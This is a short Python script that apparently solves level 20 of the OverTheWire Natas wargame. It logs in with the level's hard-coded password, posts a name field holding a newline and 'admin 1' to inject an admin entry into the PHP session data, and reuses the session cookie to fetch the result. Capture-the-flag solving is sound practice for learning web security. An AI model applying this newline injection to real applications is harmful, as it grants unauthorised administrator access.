import requests
from pathlib import Path

url = 'http://natas20.natas.labs.overthewire.org?debug=true'
username = 'natas20'
password = 'guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH'

# url = 'http://127.0.0.1:30009'
# username = 'natas20'
# password = 'guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH'

auth = (username, password)
CURR_DIR = Path(__file__).absolute().parent


def save_html(name: str, data: str):
    (CURR_DIR / "html" / f"{name}.html").write_text(data)

res = requests.post(url, auth=auth, params={"debug":'1'}, data={"name": 'aa\nadmin 1'})
res = requests.get(url, auth=auth, 
                   params={"debug": '1'}, 
                   cookies={"PHPSESSID": res.cookies['PHPSESSID']})
save_html("solution", res.text)
